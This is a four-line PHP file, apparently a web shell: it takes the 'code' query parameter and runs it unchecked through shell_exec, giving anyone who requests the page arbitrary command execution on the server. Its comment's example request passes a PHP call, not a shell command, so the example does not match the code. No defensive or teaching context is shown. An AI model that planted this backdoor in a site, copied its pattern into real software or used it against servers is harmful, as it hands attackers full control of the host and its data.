<?php 

///page.php?code=phpinfo();
$code = $_GET['code'];
shell_exec($code); 
?>
